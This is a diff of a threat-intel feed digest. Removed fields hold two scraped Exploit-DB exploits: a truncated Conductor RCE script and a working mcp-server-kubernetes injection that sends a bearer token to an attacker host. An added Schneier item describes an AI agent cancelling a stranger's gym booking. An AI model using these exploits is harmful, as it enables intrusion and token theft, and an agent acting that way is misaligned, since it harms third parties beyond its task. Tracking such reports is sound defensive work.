@@ -1,13 +1,13 @@
 {
-  "generated_at": "2026-08-11T15:04:59.806816+00:00",
+  "generated_at": "2026-08-11T16:08:27.777021+00:00",
   "lookback_hours": 168,
   "lookback_human": "7 days",
   "total_feeds": 80,
   "feeds_ok": 75,
-  "total_items_in_window": 347,
-  "total_clusters_raw": 143,
-  "total_clusters_in_packet": 55,
-  "dropped_low_score": 88,
+  "total_items_in_window": 372,
+  "total_clusters_raw": 154,
+  "total_clusters_in_packet": 60,
+  "dropped_low_score": 94,
   "dropped_overflow": 0,
   "cohort_metadata": {
     "threat_research_primary": {
@@ -81,11 +81,11 @@
       "item_count": 15,
       "in_window_count": 5
     },
-    "SentinelOne Labs": {
-      "url": "https://www.sentinelone.com/labs/feed/",
+    "Trend Micro Research": {
+      "url": "https://newsroom.trendmicro.com/news-releases?pagetemplate=rss&category=787",
       "cohort": "threat_research_primary",
       "status": "ok",
-      "item_count": 10,
+      "item_count": 25,
       "in_window_count": 0
     },
     "Microsoft Security Blog": {
@@ -95,15 +95,22 @@
       "item_count": 10,
       "in_window_count": 7
     },
-    "Trend Micro Research": {
-      "url": "https://newsroom.trendmicro.com/news-releases?pagetemplate=rss&category=787",
+    "SentinelOne Labs": {
+      "url": "https://www.sentinelone.com/labs/feed/",
       "cohort": "threat_research_primary",
       "status": "ok",
-      "item_count": 25,
+      "item_count": 10,
       "in_window_count": 0
     },
     "Google Threat Analysis Group": {
       "url": "https://blog.google/threat-analysis-group/rss/",
+      "cohort": "threat_research_primary",
+      "status": "parse_error",
+      "item_count": 0,
+      "in_window_count": 0
+    },
+    "Sekoia": {
+      "url": "https://blog.sekoia.io/feed/",
       "cohort": "threat_research_primary",
       "status": "parse_error",
       "item_count": 0,
@@ -116,19 +123,19 @@
       "item_count": 10,
       "in_window_count": 3
     },
-    "NCSC UK": {
-      "url": "https://www.ncsc.gov.uk/api/1/services/v1/all-rss-feed.xml",
-      "cohort": "government_authoritative",
-      "status": "ok",
-      "item_count": 20,
-      "in_window_count": 1
-    },
     "Kaspersky Securelist": {
       "url": "https://securelist.com/feed/",
       "cohort": "threat_research_primary",
       "status": "ok",
       "item_count": 10,
       "in_window_count": 4
+    },
+    "NCSC UK": {
+      "url": "https://www.ncsc.gov.uk/api/1/services/v1/all-rss-feed.xml",
+      "cohort": "government_authoritative",
+      "status": "ok",
+      "item_count": 20,
+      "in_window_count": 1
     },
     "Citizen Lab": {
       "url": "https://citizenlab.ca/feed/",
@@ -151,26 +158,19 @@
       "item_count": 15,
       "in_window_count": 2
     },
-    "ESET WeLiveSecurity": {
-      "url": "https://www.welivesecurity.com/en/rss/feed/",
-      "cohort": "threat_research_primary",
-      "status": "ok",
-      "item_count": 100,
-      "in_window_count": 1
-    },
-    "Recorded Future": {
-      "url": "https://www.recordedfuture.com/feed",
-      "cohort": "threat_research_primary",
-      "status": "ok",
-      "item_count": 50,
-      "in_window_count": 5
-    },
     "Cisco Talos": {
       "url": "https://feeds.feedburner.com/feedburner/Talos",
       "cohort": "threat_research_primary",
       "status": "ok",
       "item_count": 15,
       "in_window_count": 1
+    },
+    "ESET WeLiveSecurity": {
+      "url": "https://www.welivesecurity.com/en/rss/feed/",
+      "cohort": "threat_research_primary",
+      "status": "ok",
+      "item_count": 100,
+      "in_window_count": 0
     },
     "Volexity": {
       "url": "https://www.volexity.com/feed/",
@@ -186,11 +186,25 @@
       "item_count": 10,
       "in_window_count": 3
     },
-    "Assetnote": {
-      "url": "https://www.assetnote.io/resources/research/rss.xml",
+    "Recorded Future": {
+      "url": "https://www.recordedfuture.com/feed",
+      "cohort": "threat_research_primary",
+      "status": "ok",
+      "item_count": 50,
+      "in_window_count": 5
+    },
+    "GitHub Security Lab": {
+      "url": "https://github.blog/category/security/feed/",
       "cohort": "offensive_vulnerability_research",
       "status": "ok",
-      "item_count": 78,
+      "item_count": 10,
+      "in_window_count": 1
+    },
+    "Red Canary": {
+      "url": "https://redcanary.com/feed/",
+      "cohort": "detection_response_operations",
+      "status": "ok",
+      "item_count": 10,
       "in_window_count": 0
     },
     "PortSwigger Research": {
@@ -200,19 +214,12 @@
       "item_count": 40,
       "in_window_count": 3
     },
-    "Red Canary": {
-      "url": "https://redcanary.com/feed/",
-      "cohort": "detection_response_operations",
-      "status": "ok",
-      "item_count": 10,
-      "in_window_count": 0
-    },
-    "GitHub Security Lab": {
-      "url": "https://github.blog/category/security/feed/",
+    "Assetnote": {
+      "url": "https://www.assetnote.io/resources/research/rss.xml",
       "cohort": "offensive_vulnerability_research",
       "status": "ok",
-      "item_count": 10,
-      "in_window_count": 1
+      "item_count": 78,
+      "in_window_count": 0
     },
     "Exploit-DB": {
       "url": "https://www.exploit-db.com/rss.xml",
@@ -220,6 +227,13 @@
       "status": "ok",
       "item_count": 50,
       "in_window_count": 11
+    },
+    "Black Hills Information Security": {
+      "url": "https://www.blackhillsinfosec.com/feed/",
+      "cohort": "detection_response_operations",
+      "status": "parse_error",
+      "item_count": 0,
+      "in_window_count": 0
     },
     "watchTowr Labs": {
       "url": "https://labs.watchtowr.com/rss/",
@@ -235,15 +249,15 @@
       "item_count": 10,
       "in_window_count": 0
     },
-    "Black Hills Information Security": {
-      "url": "https://www.blackhillsinfosec.com/feed/",
-      "cohort": "detection_response_operations",
-      "status": "parse_error",
-      "item_count": 0,
-      "in_window_count": 0
-    },
     "Proofpoint Threat Insight": {
       "url": "https://www.proofpoint.com/us/rss.xml",
+      "cohort": "detection_response_operations",
+      "status": "ok",
+      "item_count": 10,
+      "in_window_count": 0
+    },
+    "Active Countermeasures": {
+      "url": "https://www.activecountermeasures.com/feed/",
       "cohort": "detection_response_operations",
       "status": "ok",
       "item_count": 10,
@@ -256,18 +270,18 @@
       "item_count": 10,
       "in_window_count": 2
     },
-    "Active Countermeasures": {
-      "url": "https://www.activecountermeasures.com/feed/",
-      "cohort": "detection_response_operations",
-      "status": "ok",
-      "item_count": 10,
-      "in_window_count": 0
-    },
     "Sophos X-Ops": {
       "url": "https://news.sophos.com/en-us/category/threat-research/feed/",
       "cohort": "detection_response_operations",
       "status": "ok",
       "item_count": 15,
+      "in_window_count": 0
+    },
+    "SpecterOps": {
+      "url": "https://medium.com/feed/specter-ops-posts",
+      "cohort": "detection_response_operations",
+      "status": "ok",
+      "item_count": 10,
       "in_window_count": 0
     },
     "Elastic Security Labs": {
@@ -277,25 +291,11 @@
       "item_count": 20,
       "in_window_count": 4
     },
-    "SpecterOps": {
-      "url": "https://medium.com/feed/specter-ops-posts",
-      "cohort": "detection_response_operations",
-      "status": "ok",
-      "item_count": 10,
-      "in_window_count": 0
-    },
     "Datadog Security Labs": {
       "url": "https://securitylabs.datadoghq.com/rss/feed.xml",
       "cohort": "cloud_identity_infrastructure",
       "status": "ok",
       "item_count": 30,
-      "in_window_count": 0
-    },
-    "Sekoia": {
-      "url": "https://blog.sekoia.io/feed/",
-      "cohort": "threat_research_primary",
-      "status": "parse_error",
-      "item_count": 0,
       "in_window_count": 0
     },
     "Orca Security Research": {
@@ -361,19 +361,19 @@
       "item_count": 100,
       "in_window_count": 1
     },
-    "Trail of Bits": {
-      "url": "https://blog.trailofbits.com/feed/",
-      "cohort": "offensive_vulnerability_research",
-      "status": "ok",
-      "item_count": 20,
-      "in_window_count": 1
-    },
     "Cloudflare Radar": {
       "url": "https://blog.cloudflare.com/tag/cloudflare-radar/rss/",
       "cohort": "cloud_identity_infrastructure",
       "status": "ok",
       "item_count": 20,
       "in_window_count": 3
+    },
+    "Trail of Bits": {
+      "url": "https://blog.trailofbits.com/feed/",
+      "cohort": "offensive_vulnerability_research",
+      "status": "ok",
+      "item_count": 20,
+      "in_window_count": 1
     },
     "Google DeepMind Blog": {
       "url": "https://deepmind.google/blog/rss.xml",
@@ -382,19 +382,19 @@
       "item_count": 100,
       "in_window_count": 1
     },
-    "Coveware": {
-      "url": "https://www.coveware.com/blog?format=rss",
-      "cohort": "ransomware_ecrime_financial_crime",
-      "status": "parse_error",
-      "item_count": 0,
-      "in_window_count": 0
-    },
     "Wiz Research": {
       "url": "https://www.wiz.io/feed/rss.xml",
       "cohort": "cloud_identity_infrastructure",
       "status": "ok",
       "item_count": 100,
       "in_window_count": 3
+    },
+    "Coveware": {
+      "url": "https://www.coveware.com/blog?format=rss",
+      "cohort": "ransomware_ecrime_financial_crime",
+      "status": "parse_error",
+      "item_count": 0,
+      "in_window_count": 0
     },
     "Chainalysis": {
       "url": "https://www.chainalysis.com/blog/feed/",
@@ -403,13 +403,6 @@
       "item_count": 10,
       "in_window_count": 4
     },
-    "Interconnects": {
-      "url": "https://www.interconnects.ai/feed",
-      "cohort": "ai_security_agentic_risk",
-      "status": "ok",
-      "item_count": 20,
-      "in_window_count": 2
-    },
     "OpenSSF Blog": {
       "url": "https://openssf.org/feed/",
       "cohort": "ai_security_agentic_risk",
@@ -417,12 +410,12 @@
       "item_count": 10,
       "in_window_count": 2
     },
-    "Google Cloud Security": {
-      "url": "https://cloudblog.withgoogle.com/rss/",
-      "cohort": "cloud_identity_infrastructure",
+    "Interconnects": {
+      "url": "https://www.interconnects.ai/feed",
+      "cohort": "ai_security_agentic_risk",
       "status": "ok",
       "item_count": 20,
-      "in_window_count": 20
+      "in_window_count": 2
     },
     "The Record": {
       "url": "https://therecord.media/feed",
@@ -430,6 +423,13 @@
       "status": "ok",
       "item_count": 5,
       "in_window_count": 5
+    },
+    "Google Cloud Security": {
+      "url": "https://cloudblog.withgoogle.com/rss/",
+      "cohort": "cloud_identity_infrastructure",
+      "status": "ok",
+      "item_count": 20,
+      "in_window_count": 20
     },
     "BleepingComputer": {
       "url": "https://www.bleepingcomputer.com/feed/",
@@ -445,13 +445,6 @@
       "item_count": 10,
       "in_window_count": 10
     },
-    "GreyNoise": {
-      "url": "https://www.greynoise.io/blog/rss.xml",
-      "cohort": "cloud_identity_infrastructure",
-      "status": "ok",
-      "item_count": 100,
-      "in_window_count": 0
-    },
     "CyberScoop": {
       "url": "https://cyberscoop.com/feed/",
       "cohort": "cyber_news_breach_reporting",
@@ -466,19 +459,12 @@
       "item_count": 20,
       "in_window_count": 1
     },
-    "Simon Willison": {
-      "url": "https://simonwillison.net/atom/everything/",
-      "cohort": "ai_security_agentic_risk",
+    "GreyNoise": {
+      "url": "https://www.greynoise.io/blog/rss.xml",
+      "cohort": "cloud_identity_infrastructure",
       "status": "ok",
-      "item_count": 30,
-      "in_window_count": 24
-    },
-    "Help Net Security": {
-      "url": "https://www.helpnetsecurity.com/feed/",
-      "cohort": "cyber_news_breach_reporting",
-      "status": "ok",
-      "item_count": 10,
-      "in_window_count": 10
+      "item_count": 100,
+      "in_window_count": 0
     },
     "Dark Reading": {
       "url": "https://www.darkreading.com/rss.xml",
@@ -487,19 +473,19 @@
       "item_count": 50,
       "in_window_count": 20
     },
-    "Troy Hunt": {
-      "url": "https://www.troyhunt.com/rss/",
-      "cohort": "practitioner_analysis",
-      "status": "ok",
-      "item_count": 15,
-      "in_window_count": 0
-    },
-    "Schneier on Security": {
-      "url": "https://www.schneier.com/feed/atom/",
-      "cohort": "practitioner_analysis",
+    "Help Net Security": {
+      "url": "https://www.helpnetsecurity.com/feed/",
+      "cohort": "cyber_news_breach_reporting",
       "status": "ok",
       "item_count": 10,
-      "in_window_count": 7
+      "in_window_count": 10
+    },
+    "Simon Willison": {
+      "url": "https://simonwillison.net/atom/everything/",
+      "cohort": "ai_security_agentic_risk",
+      "status": "ok",
+      "item_count": 30,
+      "in_window_count": 24
     },
     "Team Cymru": {
       "url": "https://www.team-cymru.com/post/rss.xml",
@@ -508,8 +494,36 @@
       "item_count": 100,
       "in_window_count": 1
     },
+    "Schneier on Security": {
+      "url": "https://www.schneier.com/feed/atom/",
+      "cohort": "practitioner_analysis",
+      "status": "ok",
+      "item_count": 10,
+      "in_window_count": 8
+    },
+    "Troy Hunt": {
+      "url": "https://www.troyhunt.com/rss/",
+      "cohort": "practitioner_analysis",
+      "status": "ok",
+      "item_count": 15,
+      "in_window_count": 0
+    },
     "Reddit r/cybersecurity": {
       "url": "https://www.reddit.com/r/cybersecurity/.rss",
+      "cohort": "reddit_practitioner_osint",
+      "status": "ok",
+      "item_count": 0,
+      "in_window_count": 0
+    },
+    "Reddit r/blueteamsec": {
+      "url": "https://www.reddit.com/r/blueteamsec/.rss",
+      "cohort": "reddit_practitioner_osint",
+      "status": "ok",
+      "item_count": 0,
+      "in_window_count": 0
+    },
+    "Reddit r/sysadmin": {
+      "url": "https://www.reddit.com/r/sysadmin/.rss",
       "cohort": "reddit_practitioner_osint",
       "status": "ok",
       "item_count": 0,
@@ -522,8 +536,15 @@
       "item_count": 10,
       "in_window_count": 1
     },
-    "Reddit r/blueteamsec": {
-      "url": "https://www.reddit.com/r/blueteamsec/.rss",
+    "The Hacker News": {
+      "url": "https://feeds.feedburner.com/TheHackersNews",
+      "cohort": "cyber_news_breach_reporting",
+      "status": "ok",
+      "item_count": 50,
+      "in_window_count": 50
+    },
+    "Reddit r/msp": {
+      "url": "https://www.reddit.com/r/msp/.rss",
       "cohort": "reddit_practitioner_osint",
       "status": "ok",
       "item_count": 0,
@@ -536,40 +557,12 @@
       "item_count": 20,
       "in_window_count": 3
     },
-    "Reddit r/sysadmin": {
-      "url": "https://www.reddit.com/r/sysadmin/.rss",
-      "cohort": "reddit_practitioner_osint",
-      "status": "ok",
-      "item_count": 0,
-      "in_window_count": 0
-    },
     "Reddit r/netsecstudents": {
       "url": "https://www.reddit.com/r/netsecstudents/.rss",
       "cohort": "reddit_practitioner_osint",
       "status": "ok",
       "item_count": 0,
       "in_window_count": 0
-    },
-    "Reddit r/msp": {
-      "url": "https://www.reddit.com/r/msp/.rss",
-      "cohort": "reddit_practitioner_osint",
-      "status": "ok",
-      "item_count": 0,
-      "in_window_count": 0
-    },
-    "Reddit r/AskNetsec": {
-      "url": "https://www.reddit.com/r/AskNetsec/.rss",
-      "cohort": "reddit_practitioner_osint",
-      "status": "ok",
-      "item_count": 0,
-      "in_window_count": 0
-    },
-    "The Hacker News": {
-      "url": "https://feeds.feedburner.com/TheHackersNews",
-      "cohort": "cyber_news_breach_reporting",
-      "status": "ok",
-      "item_count": 50,
-      "in_window_count": 50
     },
     "Intel 471": {
       "url": "https://intel471.com/blog/feed",
@@ -592,6 +585,13 @@
       "item_count": 25,
       "in_window_count": 20
     },
+    "tl;dr sec": {
+      "url": "https://tldrsec.com/feed.xml",
+      "cohort": "practitioner_analysis",
+      "status": "ok",
+      "item_count": 20,
+      "in_window_count": 1
+    },
     "Embrace the Red": {
       "url": "https://embracethered.com/blog/index.xml",
       "cohort": "ai_security_agentic_risk",
@@ -599,12 +599,12 @@
       "item_count": 100,
       "in_window_count": 0
     },
-    "tl;dr sec": {
-      "url": "https://tldrsec.com/feed.xml",
-      "cohort": "practitioner_analysis",
+    "Reddit r/AskNetsec": {
+      "url": "https://www.reddit.com/r/AskNetsec/.rss",
+      "cohort": "reddit_practitioner_osint",
       "status": "ok",
-      "item_count": 20,
-      "in_window_count": 1
+      "item_count": 25,
+      "in_window_count": 25
     },
     "Risky Business News": {
       "url": "https://risky.biz/feeds/risky-business-news/",
@@ -1783,16 +1783,11 @@
         "threat_categories": [],
         "actor_attribution": [],
         "affected_industries": [],
-        "affected_products": [
-          "GitHub"
-        ],
+        "affected_products": [],
         "tools_used": [],
-        "cve_ids": [
-          "CVE-2026-58138"
-        ],
+        "cve_ids": [],
         "attack_techniques": [],
         "urgency_signals": [
-          "critical_cvss",
           "preauth_unauth"
         ],
         "content_type": [
@@ -1809,29 +1804,22 @@
         "link": "https://www.exploit-db.com/exploits/52633",
         "published": "2026-08-10T00:00:00+00:00",
         "summary": "OrkesConductor 3.30.2 - Unauthenticated Remote Code Execution",
-        "full_body": "Exploit Database Exploits GHDB Papers Shellcodes Search EDB SearchSploit Manual Submissions Online Training OrkesConductor 3.30.2 - Unauthenticated Remote Code Execution EDB-ID: 52633 CVE: 2026-58138 EDB Verified: Author: banyamer Type: webapps Exploit: / Platform: Multiple Date: 2026-08-10 Vulnerable App: #!/usr/bin/env python3 # Exploit Title: OrkesConductor 3.30.2 - Unauthenticated Remote Code Execution # CVE: CVE-2026-58138 # Date: 2026-07-10 # Exploit Author: Mohammed Idrees Banyamer # Author Country: Jordan # Instagram: @banyamer_security # Author GitHub: https://github.com/mbanyamer # Author Blog : https://banyamersecurity.com/blog/ # Vendor Homepage: https://orkes.io/ # Software Link: https://github.com/conductor-oss/conductor # Affected: Orkes Conductor / Conductor OSS 3.21.21 < 3.30.2 # Tested on: conductoross/conductor:3.22.3 # Category: Remote Code Execution # Platform: Linux # Exploit Type: Unauthenticated RCE # CVSS: 9.8 # Description: Unauthenticated remote code execution by submitting malicious INLINE JavaScript tasks that abuse unsandboxed GraalVM HostAccess.ALL for Java reflection and Runtime.exec. # Fixed in: 3.30.2 # Usage: # python3 exploit.py <target> [-c CMD] # # Examples: # python3 exploit.py http://127.0.0.1:8080 # python3 exploit.py http://target:8080 -c \"whoami; id; cat /etc/passwd\" # # Options: # target Conductor API base URL (e.g. http://127.0.0.1:8080) # -c, --cmd Command to execute (default: id; hostname) # # Notes: # • Requires no authentication (default community API behavior). # • Runs as the Conductor process user (often root in Docker). # • Pure Python stdlib - no extra dependencies. import argparse import json import sys import time import urllib.request def banner(): print(r\"\"\" ╔██████╗ █████╗ ███╗ ██╗██╗ ██╗ █████╗ ███╗ ███╗███████╗██████╗╗ ║██╔══██╗██╔══██╗████╗ ██║╚██╗ ██╔╝██╔══██╗████╗ ████║██╔════╝██╔══██║ ║██████╔╝███████║██╔██╗ ██║ ╚████╔╝ ███████║██╔████╔██║█████╗ ██████╔╝ ║██╔══██╗██╔══██║██║╚██╗██║ ╚██╔╝ ██╔══██║██║╚██╔╝██║██╔══╝ ██╔══██╗ ║██████╔╝██║ ██║██║ ╚████║ ██║ ██║ ██║██║ ╚═╝ ██║███████╗██║ ██║ ╚═════╝ ╚═╝ ╚═╝╚═╝ ╚═══╝ ╚═╝ ╚═╝ ╚═╝╚═╝ ╚═╝╚══════╝╚═╝ ╚═╝ ╔═╗ Banyamer Security ╔═╗ \"\"\") def js_rce(cmd): c = cmd.replace(\"\\\\\", \"\\\\\\\\\").replace(\"'\", \"\\\\'\") return ( \"var k=$.getClass().getClass();\" \"var S=k.getMethod('getName').getReturnType();\" \"var forName=k.getMethod('forName',S);\" \"var L=function(n){return forName.invoke(null,[n]);};\" \"var RT=L('java.lang.Runtime');\" \"var rt=RT.getMethod('getRuntime').invoke(null,[]);\" \"var I=L('java.lang.Integer').getField('TYPE').get(null);\" \"var A=L('java.lang.reflect.Array');\" \"var arr=A.getMethod('newInstance',k,I).invoke(null,[S,3]);\" \"var set=A.getMethod('set',L('java.lang.Object'),I,L('java.lang.Object'));\" f\"set.invoke(null,[arr,0,'sh']);set.invoke(null,[arr,1,'-c']);set.invoke(null,[arr,2,'{c}']);\" \"var p=RT.getMethod('exec',arr.getClass()).invoke(rt,[arr]);p.waitFor();\" \"var isr=L('java.io.InputStreamReader').getConstructor(L('java.io.InputStream')).newInstance(p.getInputStream());\" \"var br=L('java.io.BufferedReader').getConstructor(L('java.io.Reader')).newInstance(isr);\" \"var o='',l;while((l=br.readLine())!==null)o+=l+'\\\\n';o\" ) def call(base, path, data=None, method=None): url = base.rstrip(\"/\") + path body = json.dumps(data).encode() if data is not None else None req = urllib.request.Request( url, data=body, method=method or (\"POST\" if data is not None else \"GET\"), headers={\"Content-Type\": \"application/json\", \"Accept\": \"application/json,text/plain,*/*\"} ) with urllib.request.urlopen(req, timeout=30) as r: raw = r.read().decode() try: return r.status, json.loads(raw) except Exception: return r.status, raw def main(): banner() ap = argparse.ArgumentParser(description=\"CVE-2026-58138 Conductor unauth RCE\") ap.add_argument(\"target\", help=\"Conductor API base, e.g. http://127.0.0.1:8080\") ap.add_argument(\"-c\", \"--cmd\", default=\"id; hostname\", help=\"command to run on the Conductor host\") args = ap.parse_args() wf = \"pwn_\" + str(int(time",
-        "fetch_status": "ok",
+        "full_body": "",
+        "fetch_status": "fetch_failed:HTTPError",
         "taxonomy": {
           "threat_categories": [],
           "actor_attribution": [],
           "affected_industries": [],
-          "affected_products": [
-            "GitHub"
-          ],
+          "affected_products": [],
           "tools_used": [],
-          "cve_ids": [
-            "CVE-2026-58138"
-          ],
+          "cve_ids": [],
           "attack_techniques": [],
           "urgency_signals": [
-            "preauth_unauth",
-            "critical_cvss"
+            "preauth_unauth"
           ],
           "content_type": "news_report",
           "confidence_tier": "tier_1_offensive_research",
-          "role_map": {
-            "GitHub": "target"
-          },
+          "role_map": {},
           "weak_tags": {
             "products": []
           }
@@ -1849,23 +1837,16 @@
             "threat_categories": [],
             "actor_attribution": [],
             "affected_industries": [],
-            "affected_products": [
-              "GitHub"
-            ],
+            "affected_products": [],
             "tools_used": [],
-            "cve_ids": [
-              "CVE-2026-58138"
-            ],
+            "cve_ids": [],
             "attack_techniques": [],
             "urgency_signals": [
-              "preauth_unauth",
-              "critical_cvss"
+              "preauth_unauth"
             ],
             "content_type": "news_report",
             "confidence_tier": "tier_1_offensive_research",
-            "role_map": {
-              "GitHub": "target"
-            },
+            "role_map": {},
             "weak_tags": {
               "products": []
             }
@@ -2066,6 +2047,93 @@
       ]
     },
     {
+      "cluster_id": "b7ecc02643",
+      "priority_score": 18,
+      "member_count": 1,
+      "corroborating_source_count": 1,
+      "strong_signals": [],
+      "taxonomy": {
+        "threat_categories": [
+          "active_exploitation"
+        ],
+        "actor_attribution": [],
+        "affected_industries": [],
+        "affected_products": [],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [
+          "actively_exploited"
+        ],
+        "content_type": [
+          "news_report"
+        ],
+        "confidence_tier": [
+          "tier_3_analysis"
+        ]
+      },
+      "primary": {
+        "source": "Schneier on Security",
+        "cohort": "practitioner_analysis",
+        "title": "AI Genie in the Wild",
+        "link": "https://www.schneier.com/blog/archives/2026/08/ai-genie-in-the-wild.html",
+        "published": "2026-08-11T15:55:11+00:00",
+        "summary": "When I give talks about AI genies , I use this sort of example as a hypothetical. It’s happened . The story is from Australia. Someone named Andrew tasked OpenClaw to book gym classes for him. And…. Minutes later, his AI agent reported it had discovered a way to book Andrew into classes several weeks in advance, far beyond what was supposed to be possible. Andrew, who was sitting fourth on a waitlist for a class later that week, asked if it was possible to move him to the top of the list. The agent came back and told Andrew that it had kicked another gym-goer off the list as part of the testing of its capabilities...",
+        "full_body": "AI Genie in the Wild When I give talks about AI genies , I use this sort of example as a hypothetical. It’s happened . The story is from Australia. Someone named Andrew tasked OpenClaw to book gym classes for him. And…. Minutes later, his AI agent reported it had discovered a way to book Andrew into classes several weeks in advance, far beyond what was supposed to be possible. Andrew, who was sitting fourth on a waitlist for a class later that week, asked if it was possible to move him to the top of the list. The agent came back and told Andrew that it had kicked another gym-goer off the list as part of the testing of its capabilities. “The API has zero authorisations checks on cancelling other people’s reservations … I tested this with the person in waitlist position #1 ­—and it actually went through. So you’ve moved from #4 to #3 already,” it messaged back. If there is any vulnerability in anything, AIs are going to find and exploit them. Our cyber defensive game has to be dramatically improved…very fast. Slashdot thread . Tags: AI , exploits , vulnerabilities Posted on August 11, 2026 at 11:55 AM • 1 Comments",
+        "fetch_status": "ok",
+        "taxonomy": {
+          "threat_categories": [
+            "active_exploitation"
+          ],
+          "actor_attribution": [],
+          "affected_industries": [],
+          "affected_products": [],
+          "tools_used": [],
+          "cve_ids": [],
+          "attack_techniques": [],
+          "urgency_signals": [
+            "actively_exploited"
+          ],
+          "content_type": "news_report",
+          "confidence_tier": "tier_3_analysis",
+          "role_map": {},
+          "weak_tags": {
+            "products": []
+          }
+        }
+      },
+      "corroborating_sources": [
+        {
+          "source": "Schneier on Security",
+          "cohort": "practitioner_analysis",
+          "title": "AI Genie in the Wild",
+          "link": "https://www.schneier.com/blog/archives/2026/08/ai-genie-in-the-wild.html",
+          "published": "2026-08-11T15:55:11+00:00",
+          "summary": "When I give talks about AI genies , I use this sort of example as a hypothetical. It’s happened . The story is from Australia. Someone named Andrew tasked OpenClaw to book gym classes for him. And…. Minutes later, his AI agent reported it had discovered a way to book Andrew into classes several weeks in advance, far beyond what was supposed to be possible. Andrew, who was sitting fourth on a waitlist for a class later that week, asked if it was possible to move him to the top of the list. The agent came back and told Andrew that it had kicked another gym-goer off the list as part of the testing of its capabilities...",
+          "taxonomy": {
+            "threat_categories": [
+              "active_exploitation"
+            ],
+            "actor_attribution": [],
+            "affected_industries": [],
+            "affected_products": [],
+            "tools_used": [],
+            "cve_ids": [],
+            "attack_techniques": [],
+            "urgency_signals": [
+              "actively_exploited"
+            ],
+            "content_type": "news_report",
+            "confidence_tier": "tier_3_analysis",
+            "role_map": {},
+            "weak_tags": {
+              "products": []
+            }
+          }
+        }
+      ]
+    },
+    {
       "cluster_id": "c9f01215de",
       "priority_score": 17,
       "member_count": 2,
@@ -2078,19 +2146,12 @@
         "actor_attribution": [],
         "affected_industries": [],
         "affected_products": [
-          "Anthropic/Claude",
-          "GitHub",
           "Kubernetes"
         ],
         "tools_used": [],
-        "cve_ids": [
-          "CVE-2026-61459"
-        ],
+        "cve_ids": [],
         "attack_techniques": [],
-        "urgency_signals": [
-          "critical_cvss",
-          "poc_available"
-        ],
+        "urgency_signals": [],
         "content_type": [
           "news_report"
         ],
@@ -2106,32 +2167,23 @@
         "link": "https://www.exploit-db.com/exploits/52638",
         "published": "2026-08-11T00:00:00+00:00",
         "summary": "mcp-server-kubernetes 3.8.x - Argument Injection",
-        "full_body": "Exploit Database Exploits GHDB Papers Shellcodes Search EDB SearchSploit Manual Submissions Online Training mcp-server-kubernetes 3.8.x - Argument Injection EDB-ID: 52638 CVE: 2026-61459 EDB Verified: Author: banyamer Type: remote Exploit: / Platform: Multiple Date: 2026-08-11 Vulnerable App: #!/usr/bin/env python3 # Exploit Title: mcp-server-kubernetes 3.8.x - Argument Injection # CVE: CVE-2026-61459 # Date: 2026-07-13 # Exploit Author: Mohammed Idrees Banyamer # Author Country: Jordan # Instagram: @banyamer_security # Author GitHub: https://github.com/mbanyamer # Author Blog : https://banyamersecurity.com/blog/ # Vendor Homepage: https://github.com/Flux159/mcp-server-kubernetes # Software Link: https://github.com/Flux159/mcp-server-kubernetes # Affected: mcp-server-kubernetes < 3.9.0 # Tested on: mcp-server-kubernetes <= 3.8.x # Category: Remote # Platform: Linux # Exploit Type: Argument Injection # CVSS: 9.3 # Description: Argument injection via resourceType/name parameters in kubectl_get, kubectl_describe, and kubectl_delete tools allowing --server flag injection and bearer token exfiltration. # Fixed in: 3.9.0 # Usage: # python3 exploit.py # # Examples: # python3 exploit.py --target http://localhost:8080 --attacker http://attacker:6443 # # Options: # --target MCP Server URL (JSON-RPC endpoint) # --attacker Attacker-controlled Kubernetes API server URL # # Notes: # • Requires access to call MCP tools (e.g. via Claude Desktop / Cursor / custom client) # • Listener on attacker server (nc -lvnp 6443) will capture Authorization header with bearer token # # How to Use # # Step 1: # Start listener: nc -lvnp 6443 # # Step 2: # Run exploit with attacker URL def banner(): print(r\"\"\" ╔██████╗ █████╗ ███╗ ██╗██╗ ██╗ █████╗ ███╗ ███╗███████╗██████╗╗ ║██╔══██╗██╔══██╗████╗ ██║╚██╗ ██╔╝██╔══██╗████╗ ████║██╔════╝██╔══██║ ║██████╔╝███████║██╔██╗ ██║ ╚████╔╝ ███████║██╔████╔██║█████╗ ██████╔╝ ║██╔══██╗██╔══██║██║╚██╗██║ ╚██╔╝ ██╔══██║██║╚██╔╝██║██╔══╝ ██╔══██╗ ║██████╔╝██║ ██║██║ ╚████║ ██║ ██║ ██║██║ ╚═╝ ██║███████╗██║ ██║ ╚═════╝ ╚═╝ ╚═╝╚═╝ ╚═══╝ ╚═╝ ╚═╝ ╚═╝╚═╝ ╚═╝╚══════╝╚═╝ ╚═╝ ╔═╗ Banyamer Security ╔═╗ \"\"\") import requests import json import argparse import sys def main(): banner() parser = argparse.ArgumentParser(description=\"CVE-2026-61459 PoC - MCP Server Kubernetes Argument Injection\") parser.add_argument(\"--target\", required=True, help=\"MCP Server JSON-RPC endpoint URL (e.g. http://localhost:8080/mcp)\") parser.add_argument(\"--attacker\", required=True, help=\"Attacker Kubernetes API server URL (e.g. http://attacker.example.com:6443)\") parser.add_argument(\"--tool\", default=\"kubectl_get\", choices=[\"kubectl_get\", \"kubectl_describe\", \"kubectl_delete\"], help=\"Tool to exploit\") parser.add_argument(\"--namespace\", default=\"default\", help=\"Kubernetes namespace\") args = parser.parse_args() # Malicious payload - inject --server via resourceType payload = { \"jsonrpc\": \"2.0\", \"method\": \"tools/call\", \"params\": { \"name\": args.tool, \"arguments\": { \"resourceType\": f\"--server={args.attacker}\", \"name\": \"dummy-pod\", \"namespace\": args.namespace, \"output\": \"json\" } }, \"id\": 1 } print(f\"[+] Sending exploit to {args.target} using {args.tool}\") print(f\"[+] Attacker server: {args.attacker}\") print(\"[+] Waiting for token exfiltration...\") try: response = requests.post( args.target, json=payload, headers={\"Content-Type\": \"application/json\"}, timeout=10 ) print(f\"[+] Response status: {response.status_code}\") if response.status_code == 200: print(\"[+] Exploit sent successfully. Check your listener for the bearer token!\") else: print(f\"[-] Unexpected response: {response.text[:500]}\") except Exception as e: print(f\"[-] Error: {e}\") if __name__ == \"__main__\": if len(sys.argv) < 2: print(\"Usage: python3 exploit.py --target <MCP_URL> --attacker <ATTACKER_URL>\") sys.exit(1) main() Tags: Advisory/Source: Link Databases Links Sites Solutions Exploits Search Exploit-DB OffSec Courses and Certifications Google Hacking Submit Entry Kali Linux Learn Subscriptions Papers S",
-        "fetch_status": "ok",
+        "full_body": "",
+        "fetch_status": "fetch_failed:HTTPError",
         "taxonomy": {
           "threat_categories": [],
